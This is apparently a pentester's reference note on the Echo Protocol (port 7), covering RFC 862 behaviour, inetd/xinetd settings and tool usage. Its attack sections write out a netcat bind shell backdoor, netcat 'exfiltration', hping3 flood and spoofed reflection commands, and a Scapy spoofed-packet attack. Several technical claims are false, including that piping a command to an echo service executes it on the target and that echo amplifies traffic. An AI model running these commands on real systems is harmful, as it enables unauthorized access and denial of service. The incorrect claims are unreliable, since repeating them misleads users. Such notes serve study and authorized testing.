# Index
- [[Ports, Protocols, and Services]]

# Echo

- **Port Number:** 7
- **Protocol:** TCP/UDP
- **Service Name:** Echo Protocol
- **Defined in:** RFC 862

The Echo Protocol is a basic network protocol that is defined in RFC 862. Its primary purpose is to echo back the data it receives from a client, making it an invaluable tool for network diagnostics and troubleshooting in its early days. It is often used in conjunction with other tools to test network paths and measure round-trip times.

## Overview of Features

- **TCP and UDP Support:** The protocol operates over both TCP and UDP, providing flexibility depending on the network’s needs. TCP is used for reliable, connection-oriented communication, while UDP provides a faster, connectionless service.
  
- **Symmetry in Communication:** The Echo Protocol is symmetrical, meaning the data sent by the client is returned exactly as it was received. This makes it ideal for ensuring data integrity across a network.

- **Low Overhead:** The simplicity of the protocol means it requires minimal computational resources, making it efficient for basic network tests.

- **Legacy Usage:** Although now largely obsolete, the Echo Protocol was historically used for early network diagnostics, particularly in ensuring connectivity between two nodes.

- **No Authentication or Encryption:** The protocol does not have any built-in authentication or encryption mechanisms, which contributes to its simplicity but also limits its usefulness in modern secure networks.

## Typical Use Cases

- **Network Diagnostics:** In early networking environments, the Echo Protocol was commonly used to verify the operational status of network paths and ensure that data could travel between two points without corruption.

- **Latency Measurement:** By measuring the time taken for a packet to be returned, network engineers could estimate the round-trip time and identify potential latency issues.

- **Connectivity Verification:** The protocol could be used to confirm that two hosts could communicate over a network, which was particularly important in the early days of the internet when network configurations were more manual and error-prone.

- **Testing Network Equipment:** Early network devices, such as routers and switches, often implemented the Echo Protocol to verify that they were correctly forwarding packets.

## How Echo Protocol Works

1. **Connection Establishment (TCP):**
   - **Step 1:** The client sends a SYN (synchronize) packet to the server on port 7, initiating a TCP connection.
   - **Step 2:** The server responds with a SYN-ACK (synchronize-acknowledge) packet, acknowledging the connection request.
   - **Step 3:** The client responds with an ACK (acknowledge) packet, completing the three-way handshake and establishing a connection.

2. **Data Transmission:**
   - **Step 4:** The client sends a data packet to the server. The data can be anything from a simple string to more complex binary data.
   - **Step 5:** The server, upon receiving the packet, immediately sends an identical packet back to the client.
   - **Step 6:** The client receives the echoed data and can compare it with the sent data to ensure accuracy.

3. **Connection Termination (TCP):**
   - **Step 7:** If the client or server wishes to terminate the connection, a FIN (finish) packet is sent to the other party.
   - **Step 8:** The receiving party acknowledges the termination with an ACK, followed by a FIN.
   - **Step 9:** The original sender responds with a final ACK, fully closing the TCP connection.

4. **UDP Communication:**
   - **Step 10:** The client sends a UDP packet to the server on port 7 without any prior handshake.
   - **Step 11:** The server receives the packet and, similar to TCP, sends back an identical packet to the client.
   - **Step 12:** The client receives the echoed packet. Since UDP is connectionless, no formal termination is needed.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends "Hello" to `<target_ip>`:7
- **Server:** `<target_ip>` receives "Hello" and echoes "Hello" back to `<attack_ip>`.
- **Client:** `<attack_ip>` receives "Hello" and confirms successful data transmission.

# Additional Information

## Security Considerations
- **Vulnerability to Reflection Attacks:** The Echo Protocol can be exploited in reflection attacks, where an attacker sends spoofed requests to the Echo service, causing it to flood a victim with traffic.
  
- **Deprecated Status:** Due to its simplicity and lack of security features, the Echo Protocol is generally disabled on modern systems. Its use is discouraged in favor of more secure and feature-rich diagnostic tools.

## Alternatives
- **ICMP Echo (Ping):** The most common modern alternative, ICMP Echo Request (ping), offers similar functionality but includes features like error reporting and is generally more integrated into network monitoring tools.
  
- **TCP Echo Service:** In some modern implementations, a TCP echo service may still be available as part of a suite of network diagnostics tools, but it is typically used in controlled environments.

## Advanced Usage
- **Custom Implementations:** Some custom networking tools may implement the Echo Protocol for specific diagnostics scenarios, particularly in proprietary systems where compatibility with older network standards is required.

### Modes of Operation
- **Interactive Mode:** Some implementations allow interactive sessions where the client can send multiple packets and receive corresponding echoes.
  
- **Automated Scripts:** Automation scripts can leverage the Echo Protocol to perform continuous monitoring, checking the health of network links over time.

## Configuration Files

The Echo Protocol is typically managed by the operating system or networking stack and does not require specific configuration files. However, in environments where services are manually configured (e.g., via `xinetd` or `inetd`), the following might apply:

1. **xinetd Configuration:**
  - **File Location:** `/etc/xinetd.d/echo`
  - **Configuration Example:**
    ```bash
    service echo
    {
        type = INTERNAL
        id = echo-stream
        socket_type = stream
        protocol = tcp
        wait = no
        user = root
    }
    ```
  - **Key Settings:**
    - `socket_type`: Defines whether the service uses `stream` (TCP) or `dgram` (UDP).
    - `protocol`: Specifies the protocol (TCP/UDP).
    - `wait`: Determines if the server waits for the process to complete before accepting new connections (`yes` for sequential, `no` for concurrent).

2. **inetd Configuration:**
  - **File Location:** `/etc/inetd.conf`
  - **Configuration Example:**
    ```bash
    echo stream tcp nowait root internal
    echo dgram udp wait root internal
    ```
  - **Key Settings:**
    - `stream`: Indicates TCP usage.
    - `dgram`: Indicates UDP usage.
    - `nowait`: Allows the server to handle multiple connections simultaneously.

## Potential Misconfigurations

1. **Echo Service Enabled on Public-Facing Network:**
   - **Risk:** Exposing the Echo service on a public network can lead to potential abuse, including reflection/amplification attacks.
   - **Exploitation:** An attacker can send crafted packets to the Echo service, using spoofed IP addresses, causing the server to flood the spoofed address with responses.

2. **Unfiltered Port 7:**
   - **Risk:** If port 7 is not adequately filtered by firewalls, it may be used by attackers to gather information about the network or initiate DDoS attacks.
   - **Exploitation:** Attackers can use tools like `nmap` to identify the service and potentially exploit it for information gathering or denial-of-service attacks.

3. **No Rate Limiting:**
   - **Risk:** Without rate limiting, the Echo service can be overwhelmed by a flood of requests, leading to a denial-of-service condition.
   - **Exploitation:** An attacker sends a high volume of echo requests, causing the service to consume excessive network or processing resources.

## Default Credentials

The Echo Protocol does not require authentication, so there are no default credentials associated with it.

# Interaction and Tools

## Tools

### [[Telnet]]
- **Telnet Connect:** Establishes a connection to the specified IP.
	```bash
	telnet <target_ip> 23
	```
## Exploitation Tools

### [[Metasploit]]


### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 7"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 7
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 7
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
	````bash
	nc <target_ip> 7 -u
	````
- **Continuous Echo Test (Custom Script):** Continuously sends the string "test" every second, useful for monitoring network health over time.
    ```bash
    while true; do echo "test" | nc <target_ip> 7; sleep 1; done
    ```
- **Latency Measurement (Custom Script):**Measures the time taken for a packet to be echoed back, providing a simple latency measurement.
    ```bash
    start=$(date +%s%N); echo "test" | nc <target_ip> 7; end=$(date +%s%N); echo "Latency: $((($end-$start)/1000000)) ms"
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 7
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 7 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:<target_port>
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p <target_port> -c 1
    ```

### [[Scapy]]
- **Echo Packet Crafting (Custom Script):** Custom packet crafting to interact with the Echo Protocol.
    ```python
    from scapy.all import *
    packet = IP(dst="<target_ip>")/UDP(dport=7)/Raw(load="test")
    response = sr1(packet)
    print(response.show())
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 7
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    echo "test" | nc <target_ip> 7
    ```
- **Description:** Enumerates the Echo service by sending test data and checking the response.

### Network Mapping via Echo
- **Tool:** [[NetCat]]
    ```bash
    for i in {1..254}; do echo "Ping" | nc 192.168.1.$i 7; done
    ```
- **Description:** Maps live hosts in a subnet by sending echo requests to each IP.

## Persistence

### Establishing Backdoor using Echo
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    nc -l -p 7 -e /bin/sh
    ```
- **Description:** Binds a shell to the Echo service (if misconfigured), allowing persistent access.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 7"
    ```
- **Description:** Capture traffic to analyze any sensitive data inadvertently sent (rare for Echo).

## Defense Evasion

### Low Noise Probing
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "probe" | nc <target_ip> 7
    ```
- **Description:** Using low-frequency probes to avoid detection by IDS/IPS systems.

## Data Exfiltration

### Echo-based Data Exfiltration
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    echo "secret_data_exfil" | nc <target_ip> 7
    ```
- **Description:** Covertly exfiltrate small amounts of data using the Echo service as a carrier.



# Exploits and Attacks

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Echo Loop Vulnerability
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    while true; do echo "loop" | nc <target_ip_1> 7 | nc <target_ip_2> 7; done
    ```
- **Description:** Create a loop between two devices, causing a self-sustaining flow of traffic that can overwhelm network resources.

### Amplification Attack
- **Tool:** [[Scapy]]
    ```python
    from scapy.all import *
    send(IP(src="<spoofed_ip>", dst="<target_ip>")/UDP(dport=7)/Raw(load="flood"))
    ```
- **Description:** Exploiting the Echo service to amplify traffic towards a spoofed victim, causing network congestion.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 862|https://tools.ietf.org/html/rfc862|
|Nmap Echo Probe|https://nmap.org/book/nmap-probes.html|
|Netcat Guide|https://nmap.org/ncat/guide/index.html|
|Telnet Reference|https://www.gnu.org/software/inetutils/manual/html_node/telnet.html|
|ICMP Echo (Ping) RFC|https://tools.ietf.org/html/rfc792|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|hping3 Manual|http://www.hping.org/manpage.html|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|
|Linux man-pages| https://man7.org/linux/man-pages/|